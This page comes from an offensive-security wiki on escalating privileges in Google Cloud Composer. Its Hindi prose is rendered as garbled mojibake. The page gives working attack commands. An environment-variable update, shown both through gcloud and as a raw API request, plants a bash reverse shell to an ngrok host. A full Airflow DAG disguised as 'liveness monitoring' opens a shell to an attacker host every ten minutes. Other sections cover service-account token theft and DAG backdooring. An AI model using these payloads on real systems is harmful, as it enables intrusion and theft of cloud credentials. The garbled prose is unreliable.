# GCP - Composer Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## composer

‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è:

{% content-ref url="../gcp-services/gcp-composer-enum.md" %}
[gcp-composer-enum.md](../gcp-services/gcp-composer-enum.md)
{% endcontent-ref %}

### `composer.environments.create`

‡§Ø‡§π **‡§®‡§à ‡§¨‡§®‡§æ‡§à ‡§ó‡§à ‡§ï‡§Ç‡§™‡•ã‡§ú‡§º‡§∞ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£** ‡§Æ‡•á‡§Ç **‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§∏‡•á‡§µ‡§æ ‡§ñ‡§æ‡§§‡•á** ‡§ï‡•ã ‡§â‡§∏ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Ç‡§≤‡§ó‡•ç‡§® ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§ ‡§¨‡§æ‡§¶ ‡§Æ‡•á‡§Ç ‡§Ü‡§™ ‡§ï‡§Ç‡§™‡•ã‡§ú‡§º‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§∏‡•á‡§µ‡§æ ‡§ñ‡§æ‡§§‡§æ ‡§ü‡•ã‡§ï‡§® ‡§ö‡•Å‡§∞‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§
```bash
gcloud composer environments create privesc-test \
--project "${PROJECT_ID}" \
--location europe-west1 \
--service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com"
```
‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è [**‡§Ø‡§π‡§æ‡§Å**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/i-composer.environmets.create.sh) ‡§¶‡•á‡§ñ‡•á‡§Ç‡•§

### `composer.environments.update`

‡§ï‡§Ç‡§™‡•ã‡§ú‡§º‡§∞ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§ï‡•ã ‡§Ö‡§™‡§°‡•á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à, ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, env ‡§µ‡•á‡§∞‡§ø‡§è‡§¨‡§≤‡•ç‡§∏ ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ: 

{% code overflow="wrap" %}
```bash
# Even if it says you don't have enough permissions the update happens
gcloud composer environments update \
projects/<project-id>/locations/<location>/environments/<composer-env-name> \
--update-env-variables="PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19990 0>&1' & #%s" \
--location <location> \
--project <project-id>

# Call the API endpoint directly
PATCH /v1/projects/<project-id>/locations/<location>/environments/<composer-env-name>?alt=json&updateMask=config.software_config.env_variables HTTP/2
Host: composer.googleapis.com
User-Agent: google-cloud-sdk gcloud/480.0.0 command/gcloud.composer.environments.update invocation-id/826970373cd441a8801d6a977deba693 environment/None environment-version/None client-os/MACOSX client-os-ver/23.4.0 client-pltf-arch/arm interactive/True from-script/False python/3.12.3 term/xterm-256color (Macintosh; Intel Mac OS X 23.4.0)
Accept-Encoding: gzip, deflate, br
Accept: application/json
Content-Length: 178
Content-Type: application/json
X-Goog-Api-Client: cred-type/sa
Authorization: Bearer [token]
X-Allowed-Locations: 0x0

{"config": {"softwareConfig": {"envVariables": {"BROWSER": "/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/1890 0>&1' & #%s", "PYTHONWARNINGS": "all:0:antigravity.x:0:0"}}}}
```
{% endcode %}

TODO: ‡§®‡§è pypi ‡§™‡•à‡§ï‡•á‡§ú‡•ã‡§Ç ‡§ï‡•ã ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º‡§ï‡§∞ RCE ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç

### Dags ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç

‡§ö‡§æ‡§≤‡•Ç ‡§ï‡§ø‡§è ‡§ú‡§æ ‡§∞‡§π‡•á dags ‡§ï‡§æ ‡§∏‡•ç‡§∞‡•ã‡§§ ‡§ï‡•ã‡§° ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç:

{% code overflow="wrap" %}
```bash
mkdir /tmp/dags
gcloud composer environments storage dags export --environment <environment> --location <loc> --destination /tmp/dags
```
{% endcode %}

### DAGs ‡§Ü‡§Ø‡§æ‡§§ ‡§ï‡§∞‡•á‡§Ç

‡§è‡§ï ‡§´‡§º‡§æ‡§á‡§≤ ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§Ø‡§•‡§® DAG ‡§ï‡•ã‡§° ‡§ú‡•ã‡§°‡§º‡•á‡§Ç ‡§î‡§∞ ‡§á‡§∏‡•á ‡§ö‡§≤‡§æ‡§ï‡§∞ ‡§Ü‡§Ø‡§æ‡§§ ‡§ï‡§∞‡•á‡§Ç:

{% code overflow="wrap" %}
```bash
# TODO: Create dag to get a rev shell
gcloud composer environments storage dags import --environment test --location us-central1 --source /tmp/dags/reverse_shell.py
```
{% endcode %}

‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•á‡§≤ DAG:

{% code title="reverse_shell.py" %}
```python
import airflow
from airflow import DAG
from airflow.operators.bash_operator import BashOperator
from datetime import timedelta

default_args = {
'start_date': airflow.utils.dates.days_ago(0),
'retries': 1,
'retry_delay': timedelta(minutes=5)
}

dag = DAG(
'reverse_shell',
default_args=default_args,
description='liveness monitoring dag',
schedule_interval='*/10 * * * *',
max_active_runs=1,
catchup=False,
dagrun_timeout=timedelta(minutes=10),
)

# priority_weight has type int in Airflow DB, uses the maximum.
t1 = BashOperator(
task_id='bash_rev',
bash_command='bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/14382 0>&1',
dag=dag,
depends_on_past=False,
priority_weight=2**31 - 1,
do_xcom_push=False)
```
{% endcode %}

### Composer ‡§¨‡§ï‡•á‡§ü ‡§™‡§∞ ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø

‡§è‡§ï ‡§ï‡§Ç‡§™‡•ã‡§ú‡§º‡§∞ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§ï‡•á ‡§∏‡§≠‡•Ä ‡§ò‡§ü‡§ï (DAGs, ‡§™‡•ç‡§≤‡§ó‡§á‡§®‡•ç‡§∏ ‡§î‡§∞ ‡§°‡•á‡§ü‡§æ) ‡§è‡§ï GCP ‡§¨‡§ï‡•á‡§ü ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ø‡§¶‡§ø ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§á‡§∏‡§ï‡•á ‡§ä‡§™‡§∞ ‡§™‡§¢‡§º‡§®‡•á ‡§î‡§∞ ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•à, ‡§§‡•ã ‡§µ‡§π ‡§¨‡§ï‡•á‡§ü ‡§ï‡•Ä ‡§®‡§ø‡§ó‡§∞‡§æ‡§®‡•Ä ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§ú‡§¨ ‡§≠‡•Ä ‡§è‡§ï DAG ‡§¨‡§®‡§æ‡§Ø‡§æ ‡§Ø‡§æ ‡§Ö‡§™‡§°‡•á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§è‡§ï ‡§¨‡•à‡§ï‡§°‡•ã‡§∞ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** ‡§§‡§æ‡§ï‡§ø ‡§ï‡§Ç‡§™‡•ã‡§ú‡§º‡§∞ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§∏‡•ç‡§ü‡•ã‡§∞‡•á‡§ú ‡§∏‡•á ‡§¨‡•à‡§ï‡§°‡•ã‡§∞ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡•á‡•§

‡§á‡§∏ ‡§π‡§Æ‡§≤‡•á ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç:

{% content-ref url="gcp-storage-privesc.md" %}
[gcp-storage-privesc.md](gcp-storage-privesc.md)
{% endcontent-ref %}

### ‡§™‡•ç‡§≤‡§ó‡§á‡§®‡•ç‡§∏ ‡§Ü‡§Ø‡§æ‡§§ ‡§ï‡§∞‡•á‡§Ç

TODO: ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç ‡§ï‡§ø ‡§™‡•ç‡§≤‡§ó‡§á‡§®‡•ç‡§∏ ‡§Ö‡§™‡§≤‡•ã‡§° ‡§ï‡§∞‡§ï‡•á ‡§ï‡•ç‡§Ø‡§æ ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à

### ‡§°‡•á‡§ü‡§æ ‡§Ü‡§Ø‡§æ‡§§ ‡§ï‡§∞‡•á‡§Ç

TODO: ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç ‡§ï‡§ø ‡§°‡•á‡§ü‡§æ ‡§Ö‡§™‡§≤‡•ã‡§° ‡§ï‡§∞‡§ï‡•á ‡§ï‡•ç‡§Ø‡§æ ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç!
* **‡§π‡§Æ‡§æ‡§∞‡•á** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **‡§π‡§Æ‡•á‡§Ç** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç‡•§**
* ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
